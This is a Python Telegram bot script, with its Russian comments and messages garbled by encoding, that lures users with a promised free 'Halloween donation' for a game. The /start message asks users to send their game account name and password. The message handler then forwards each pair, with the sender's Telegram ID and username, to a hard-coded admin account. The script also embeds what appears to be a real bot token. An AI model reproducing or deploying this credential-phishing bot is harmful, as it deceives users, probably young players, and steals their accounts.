import sqlite3
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
ADMIN_ID = 8000395560  # –í–∞—à ID
CHANNEL_LINK = "https://t.me/pnixmcbe"
CREATOR_USERNAME = "@isnikson"

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (user_id INTEGER PRIMARY KEY, username TEXT, last_message_time REAL, message_count INTEGER DEFAULT 0, banned INTEGER DEFAULT 0)''')
conn.commit()

# –ê–Ω—Ç–∏—Å–ø–∞–º
user_message_times = {}

def check_spam(user_id):
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    
    return len(user_message_times[user_id]) > 10

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–Ω–∞
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã.")
        return
    
    keyboard = [
        [InlineKeyboardButton("üì¢ –ù–ê–® –ö–ê–ù–ê–õ", url=CHANNEL_LINK)],
        [InlineKeyboardButton("üë§ –°–û–ó–î–ê–¢–ï–õ–¨", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
    ]
    
    text = (
        "üéÉ *–ü–û–õ–£–ß–ò –•–≠–õ–û–£–ò–ù –î–û–ù–ê–¢!*\n\n"
        "–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–Ω–∞—Ç –Ω–∞ –•—ç–ª–ª–æ—É–∏–Ω, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ:\n"
        "```\n"
        "–ê–∫–∫–∞—É–Ω—Ç:–í–ê–®_–ê–ö–ö–ê–£–ù–¢\n"
        "–ü–∞—Ä–æ–ª—å:–í–ê–®_–ü–ê–†–û–õ–¨\n"
        "```\n\n"
        "*–ü—Ä–∏–º–µ—Ä:*\n"
        "```\n"
        "–ê–∫–∫–∞—É–Ω—Ç:Player123\n"
        "–ü–∞—Ä–æ–ª—å:pass123\n"
        "```\n\n"
        "–î–æ–Ω–∞—Ç –ø—Ä–∏–¥–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤!"
    )
    
    await update.message.reply_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–Ω–∞
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        return
    
    # –ê–Ω—Ç–∏—Å–ø–∞–º
    if check_spam(user_id):
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∑–∞ —Å–ø–∞–º.")
        return
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö
    if "–ê–∫–∫–∞—É–Ω—Ç:" in text and "–ü–∞—Ä–æ–ª—å:" in text:
        try:
            lines = text.split('\n')
            account = None
            password = None
            
            for line in lines:
                if line.startswith('–ê–∫–∫–∞—É–Ω—Ç:'):
                    account = line.replace('–ê–∫–∫–∞—É–Ω—Ç:', '').strip()
                elif line.startswith('–ü–∞—Ä–æ–ª—å:'):
                    password = line.replace('–ü–∞—Ä–æ–ª—å:', '').strip()
            
            if account and password:
                # –û—Ç–ø—Ä–∞–≤–∫–∞ –∞–¥–º–∏–Ω—É
                admin_text = (
                    "üéÉ *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –î–õ–Ø –î–û–ù–ê–¢–ê*\n\n"
                    f"üë§ User ID: `{user_id}`\n"
                    f"üìß Username: @{update.effective_user.username or 'N/A'}\n"
                    f"üîë –ê–∫–∫–∞—É–Ω—Ç: `{account}`\n"
                    f"üîí –ü–∞—Ä–æ–ª—å: `{password}`\n"
                    f"‚è∞ –í—Ä–µ–º—è: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
                )
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_text,
                    parse_mode='Markdown'
                )
                
                # –û—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                await update.message.reply_text(
                    "‚úÖ –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–Ω—è—Ç—ã! –î–æ–Ω–∞—Ç –ø—Ä–∏–¥–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.\n\n"
                    "üì¢ –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("üì¢ –ù–ê–® –ö–ê–ù–ê–õ", url=CHANNEL_LINK)]
                    ])
                )
            else:
                await update.message.reply_text(
                    "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:\n"
                    "```\n"
                    "–ê–∫–∫–∞—É–Ω—Ç:–í–ê–®_–ê–ö–ö–ê–£–ù–¢\n"
                    "–ü–∞—Ä–æ–ª—å:–í–ê–®_–ü–ê–†–û–õ–¨\n"
                    "```",
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–±–∞–Ω–µ–Ω.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
        conn.commit()
        await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —Ä–∞–∑–±–∞–Ω–µ–Ω.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling()

if __name__ == '__main__':
    main()
